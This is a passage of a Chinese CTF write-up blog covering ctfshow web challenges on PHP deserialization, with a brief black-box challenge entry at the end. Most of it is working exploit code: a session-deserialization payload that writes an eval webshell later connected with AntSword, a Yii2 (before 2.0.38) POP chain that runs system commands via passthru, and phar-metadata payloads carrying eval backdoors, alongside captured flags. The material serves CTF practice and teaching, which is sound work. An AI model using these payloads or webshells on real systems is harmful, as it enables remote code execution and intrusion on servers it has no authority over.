<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">require_once &#x27;inc/inc.php&#x27;;</span><br><span class="line">$GET = array(&quot;u&quot;=&gt;$_GET[&#x27;u&#x27;],&quot;pass&quot;=&gt;$_GET[&#x27;pass&#x27;]);</span><br><span class="line">if($GET)&#123;</span><br><span class="line"></span><br><span class="line">	$data= $db-&gt;get(&#x27;admin&#x27;,</span><br><span class="line">	[	&#x27;id&#x27;,</span><br><span class="line">		&#x27;UserName0&#x27;</span><br><span class="line">	],[</span><br><span class="line">		&quot;AND&quot;=&gt;[</span><br><span class="line">		&quot;UserName0[=]&quot;=&gt;$GET[&#x27;u&#x27;],</span><br><span class="line">		&quot;PassWord1[=]&quot;=&gt;$GET[&#x27;pass&#x27;] //密码必须为128位大小写字母+数字+特殊符号，防止爆破</span><br><span class="line">		]</span><br><span class="line">	]);</span><br><span class="line">	if($data[&#x27;id&#x27;])&#123;</span><br><span class="line">		//登陆成功取消次数累计</span><br><span class="line">		$_SESSION[&#x27;limit&#x27;]= 0;</span><br><span class="line">		echo json_encode(array(&quot;success&quot;,&quot;msg&quot;=&gt;&quot;欢迎您&quot;.$data[&#x27;UserName0&#x27;]));</span><br><span class="line">	&#125;else&#123;</span><br><span class="line">		//登陆失败累计次数加1</span><br><span class="line">		$_COOKIE[&#x27;limit&#x27;] = base64_encode(base64_decode($_COOKIE[&#x27;limit&#x27;])+1);</span><br><span class="line">		echo json_encode(array(&quot;error&quot;,&quot;msg&quot;=&gt;&quot;登陆失败&quot;));</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">ini_set(&#x27;display_errors&#x27;, 0);</span><br><span class="line">ini_set(&#x27;session.serialize_handler&#x27;, &#x27;php&#x27;);</span><br><span class="line">date_default_timezone_set(&quot;Asia/Shanghai&quot;);</span><br><span class="line">session_start();</span><br><span class="line">class User&#123;</span><br><span class="line">    public $username;</span><br><span class="line">    public $password;</span><br><span class="line">    public $status;</span><br><span class="line">    function __construct($username,$password)&#123;</span><br><span class="line">        $this-&gt;username = $username;</span><br><span class="line">        $this-&gt;password = $password;</span><br><span class="line">    &#125;</span><br><span class="line">    function setStatus($s)&#123;</span><br><span class="line">        $this-&gt;status=$s;</span><br><span class="line">    &#125;</span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        file_put_contents(&quot;log-&quot;.$this-&gt;username, &quot;使用&quot;.$this-&gt;password.&quot;登陆&quot;.($this-&gt;status?&quot;成功&quot;:&quot;失败&quot;).&quot;----&quot;.date_create()-&gt;format(&#x27;Y-m-d H:i:s&#x27;));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>payload；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class User&#123;</span><br><span class="line">    public $username;</span><br><span class="line">    public $password;</span><br><span class="line">    public $status;</span><br><span class="line">    function __construct($username,$password)&#123;</span><br><span class="line">        $this-&gt;username = $username;</span><br><span class="line">        $this-&gt;password = $password;</span><br><span class="line">    &#125;</span><br><span class="line">    function setStatus($s)&#123;</span><br><span class="line">        $this-&gt;status=$s;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$user=new User(&#x27;1.php&#x27;,&#x27;&lt;?php eval($_POST[1]);phpinfo();?&gt;&#x27;);</span><br><span class="line">$res=&quot;|&quot;.serialize($user);</span><br><span class="line">echo $res;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fE86NDoiVXNlciI6Mzp7czo4OiJ1c2VybmFtZSI7czo1OiIxLnBocCI7czo4OiJwYXNzd29yZCI7czozNDoiPD9waHAgZXZhbCgkX1BPU1RbMV0pO3BocGluZm8oKTs/PiI7czo2OiJzdGF0dXMiO047fQoK</span><br></pre></td></tr></table></figure>

<p>抓包改limit值</p>
<p>访问check.php实现反序列化shell的写入，会写到根目录挺奇怪的</p>
<p>url&#x2F;log-1.php</p>
<p>蚁剑连接</p>
<h2 id="web264未写"><a href="#web264未写" class="headerlink" title="web264未写"></a>web264未写</h2><h2 id="web265"><a href="#web265" class="headerlink" title="web265"></a>web265</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowAdmin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$t</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;token=<span class="variable">$t</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;token===<span class="variable language_">$this</span>-&gt;password;</span><br><span class="line">    &#125;<span class="comment">//使token=password 得return 1; echo flag</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ctfshow</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ctfshow&#x27;</span>]);</span><br><span class="line"><span class="variable">$ctfshow</span>-&gt;token=<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>());</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ctfshow</span>-&gt;<span class="title function_ invoke__">login</span>())&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>token的值等于一个随机数，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class ctfshowAdmin</span><br><span class="line">&#123;</span><br><span class="line">    public $password;</span><br><span class="line">    public $token;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;password = &amp;$this-&gt;token;</span><br><span class="line">    &#125;//不能直接等于</span><br><span class="line">&#125;</span><br><span class="line">$a = new ctfshowAdmin();</span><br><span class="line">echo serialize($a);</span><br></pre></td></tr></table></figure>

<p>引用（&amp;）的用法和应用</p>
<p>在PHP 中引用的意思是：<strong>不同的名字访问同一个变量内容</strong></p>
<p><a href="https://www.cnblogs.com/alsf/p/9621362.html">https://www.cnblogs.com/alsf/p/9621362.html</a></p>
<p>ctfshow{b3af121a-ce30-4452-a80f-9701f229041c}</p>
<h2 id="web266"><a href="#web266" class="headerlink" title="web266"></a>web266</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$cs</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="variable">$u</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable language_">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ctfshowo</span>=@<span class="title function_ invoke__">unserialize</span>(<span class="variable">$cs</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ctfshow/&#x27;</span>, <span class="variable">$cs</span>))&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Error <span class="subst">$ctfshowo</span>&quot;</span>,<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTFSHOW</span></span>&#123;&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">CTFSHOW</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:7:&quot;CTFSHOW&quot;:0:&#123;&#125;</span><br></pre></td></tr></table></figure>

<p>PHP特性：函数名和类名不区分大小写，变量名区分。</p>
<p>经过尝试hackbar,不能post  php:&#x2F;&#x2F;input,除了max hackbar,传参得到</p>
<p>ctfshow{2769a98f-097f-4919-aa09-f64ef83591dd}</p>
<h2 id="web267yii"><a href="#web267yii" class="headerlink" title="web267yii"></a>web267yii</h2><p>yii 反序列化漏洞</p>
<p>Yii是一套基于组件、用于开发大型Web应用的高性能PHP框架。Yii2 2.0.38 之前的版本存在<a href="https://so.csdn.net/so/search?q=%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&spm=1001.2101.3001.7020">反序列化</a>漏洞，程序在调用unserialize 时，攻击者可通过构造特定的恶意请求执行任意命令。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">rest</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">CreateAction</span>&#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;checkAccess = <span class="string">&#x27;phpinfo&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;id = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Faker</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">yii</span>\<span class="title class_">rest</span>\<span class="title class_">CreateAction</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$formatters</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;formatters[<span class="string">&#x27;close&#x27;</span>] = [<span class="keyword">new</span> <span class="title class_">CreateAction</span>(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">db</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Faker</span>\<span class="title class_">Generator</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_dataReader</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;_dataReader = <span class="keyword">new</span> <span class="built_in">Generator</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title class_">echo</span> <span class="title class_">base64_encode</span>(<span class="title class_">serialize</span>(<span class="title class_">new</span> <span class="title class_">yii</span>\<span class="title class_">db</span>\<span class="title class_">BatchQueryResult</span>));</span><br><span class="line">    <span class="comment">//TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjE6InlpaVxyZXN0XENyZWF0ZUFjdGlvbiI6Mjp7czoxMToiY2hlY2tBY2Nlc3MiO3M6NzoicGhwaW5mbyI7czoyOiJpZCI7czoxOiIxIjt9aToxO3M6MzoicnVuIjt9fX19</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">rest</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">CreateAction</span>&#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;checkAccess = <span class="string">&#x27;passthru&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;id = <span class="string">&#x27;tac /flag&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Faker</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">yii</span>\<span class="title class_">rest</span>\<span class="title class_">CreateAction</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$formatters</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;formatters[<span class="string">&#x27;close&#x27;</span>] = [<span class="keyword">new</span> <span class="title class_">CreateAction</span>(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">db</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Faker</span>\<span class="title class_">Generator</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_dataReader</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;_dataReader = <span class="keyword">new</span> <span class="built_in">Generator</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title class_">echo</span> <span class="title class_">base64_encode</span>(<span class="title class_">serialize</span>(<span class="title class_">new</span> <span class="title class_">yii</span>\<span class="title class_">db</span>\<span class="title class_">BatchQueryResult</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="web268"><a href="#web268" class="headerlink" title="web268"></a>web268</h2><h2 id="web276phar反序列化"><a href="#web276phar反序列化" class="headerlink" title="web276phar反序列化"></a>web276phar反序列化</h2><p>什么是phar:<br> phar类似于java中的jar打包</p>
<h2 id="phar的结构："><a href="#phar的结构：" class="headerlink" title="phar的结构："></a>phar的结构：</h2><p>stub phar文件标识，格式为<code>xxx&lt;?php xxx;__HALT_COMPILER();?&gt;;</code> (头部信息)</p>
<p><strong>manifest</strong>压缩文件的属性等信息，以<strong>序列化</strong>存储；</p>
<p>contents压缩文件的内容；</p>
<p>signature签名，放在文件末尾；</p>
<p>phar协议解析文件时，会自动触发对manifest字段的序列化字符串进行反序列化</p>
<h2 id="漏洞原理："><a href="#漏洞原理：" class="headerlink" title="漏洞原理："></a>漏洞原理：</h2><p>manifest压缩文件的属性等信息，以序列化存储；存在一段序列化的字符串；</p>
<p>调用phar伪协议，可读取 .phar文件；</p>
<p>phar协议解析文件时，会自动触发对manifest字段的序列化字符串进行反序列化。</p>
<p>注意：phar需要php&gt;&#x3D;5.2在php.ini中将phar.readonly设为Off  <strong>注意去掉前面的分号</strong></p>
<p>phar使用条件：<br> 1.phar文件能上传到服务器端。</p>
<p>2.要有可用反序列化魔术方法作为跳板。</p>
<p>3.要有文件操作函数，如file_exists(),fopen(),file_get_contents()</p>
<p>4.文件操作函数参数可控，且: &#x2F; phar等特殊字符没有被过滤</p>
<p>总结就是要有文件操作函数，然后可以去使用这个phar伪协议去读取一个.phar文件，并且在原本的代码中有魔术方法，在反序列化的过程中去执行相关的代码，进而执行我们想让它执行的。  这个phar后缀是可以修改的，没有影响</p>
<p>下面举一个例子：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Testobj</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$output</span>=<span class="string">&quot;echo &#x27;ok&#x27;;&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;output);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Testobj</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$output</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;test.phar&#x27;</span>);   <span class="comment">//删除之前的test.par文件(如果有)</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span>=<span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;test.phar&#x27;</span>);  <span class="comment">//创建一个phar对象，文件名必须以phar为后缀</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();  <span class="comment">//开始写文件</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>);  <span class="comment">//写入stub</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$o</span>=<span class="keyword">new</span> <span class="title class_">Testobj</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$o</span>-&gt;output=<span class="string">&#x27;eval($_GET[&quot;a&quot;]);&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>);<span class="comment">//写入meta-data</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>,<span class="string">&quot;test&quot;</span>);  <span class="comment">//添加要压缩的文件</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这个就是创建一个phar文件 ，将output的值写入到meta-data段中，通过filename利用phar伪协议 然后进行一个反序列化，触发了_destruct()魔术方法，执行了eval函数，也执行了我们想让它执行的。</p>
<p>下面来个简单例题实验一下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$filename</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$filename</span>))&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">md5_file</span>(<span class="variable">$filename</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//upload.php</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这个满足phar漏洞的四个基本点 1.可以上传 2.有文件操作函数 3.有魔术方法作为跳板机 4.文件操作函数的参数名可控</p>
<p>这个要生成一个phar文件的话需要改一个东西，上面有介绍，需要注意的是前面的分号要删除。</p>
<p>这个代码算是简单的了，根据上面的代码生成一个phar文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestObject</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;test.phar&#x27;</span>);   <span class="comment">//删除之前的test.par文件(如果有)</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span>=<span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;test.phar&#x27;</span>);  <span class="comment">//创建一个phar对象，文件名必须以phar为后缀</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();  <span class="comment">//开始写文件</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>);  <span class="comment">//写入stub</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$o</span>=<span class="keyword">new</span> <span class="title class_">TestObject</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>);<span class="comment">//写入meta-data</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>,<span class="string">&quot;test&quot;</span>);  <span class="comment">//添加要压缩的文件</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后改一下new的类</p>
<p>这样就生成了，然后在upload.php界面下上传这个phar文件，但是phar上传后似乎失败了，我们可以把phar后缀修改成jpg的，这样不影响</p>
<p>然后得到路径 uplod&#x2F;test.jpg</p>
<p>最后利用phar伪协议去读取一下即可</p>
<p>file&#x3D;phar:&#x2F;&#x2F;upload&#x2F;test.jpg</p>
<h2 id="执行报错如下"><a href="#执行报错如下" class="headerlink" title="执行报错如下"></a>执行报错如下</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PHP Fatal error:  Uncaught UnexpectedValueException: creating archive &quot;phar.phar&quot; disabled by the php.ini setting phar.readonly</span><br></pre></td></tr></table></figure>

<p>打开php.ini 文件修改为如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;phar.readonly = On   //修改前</span><br><span class="line">phar.readonly = Off ///修改后</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>web</category>
        <category>ctfshow</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow-黑盒测试</title>
    <url>/2023/04/16/ctfshow%E5%90%88%E9%9B%86-ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/</url>
    <content><![CDATA[<p>  ctfshow 黑盒测试</p>
  <span id="more"></span>

<h2 id="web381"><a href="#web381" class="headerlink" title="web381"></a>web381</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://81d1568a-588d-4fc9-abeb-369f884876f7.challenge.ctf.show/alsckdfy/</span><br></pre></td></tr></table></figure>

<p>访问这个地址即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">  &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, maximum-scale=1&quot;&gt;</span><br><span class="line">  &lt;title&gt;CTFshow萌新博客&lt;/title&gt;</span><br><span class="line">  &lt;link rel=&quot;stylesheet&quot; href=&quot;layui/css/layui.css&quot;&gt;</span><br><span class="line">  &lt;link rel=&quot;stylesheet&quot; href=&quot;layui/css/global.css&quot;&gt;</span><br><span class="line">  &lt;link rel=&quot;stylesheet&quot; href=&quot;alsckdfy/layui/css/tree.css&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br></pre></td></tr></table></figure>

<p>这个地址在源码里可以看到</p>
